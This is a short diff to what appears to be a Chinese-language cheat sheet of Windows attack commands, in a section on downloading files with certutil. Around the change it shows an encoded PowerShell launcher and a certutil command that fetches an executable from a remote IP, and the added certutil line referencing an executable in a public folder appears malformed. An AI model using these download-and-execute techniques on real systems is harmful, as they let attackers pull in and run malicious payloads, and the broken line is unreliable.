@@ -1030,6 +1030,10 @@ powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ## certutil.exe下载
 
 ```
+C:\Windows\System32\certutil.exe C:\Users\Public\cer.exe
+```
+
+```
 certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
 ```
 
